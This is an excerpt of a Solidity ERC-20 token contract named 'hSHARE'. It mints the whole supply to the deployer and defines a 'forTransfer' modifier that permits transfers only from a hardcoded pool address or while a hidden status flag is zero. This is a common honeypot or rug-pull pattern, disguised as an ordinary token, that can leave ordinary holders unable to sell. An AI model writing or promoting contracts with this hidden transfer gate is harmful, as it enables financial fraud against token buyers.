...
contract hSHAREToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenHS_totalSupply;
    uint256 private _tokenHS_statHS = 0;
    uint256 public stakingPoolHSStatHS = 0;

    string private _tokenHS_name;
    string private _tokenHS_symbol;

    address private _poolHSAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenHS_name = "hSHARE";
        _tokenHS_symbol = "hSHARE";
        _tokenHS_totalSupply = 54500 * 10 ** 18;
        _balances[msg.sender] = _tokenHS_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolHSAddress || _tokenHS_statHS == 0);
        _;
    }
    ...
    function name() public view virtual override returns (string memory) {
        return _tokenHS_name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _tokenHS_symbol;
    }
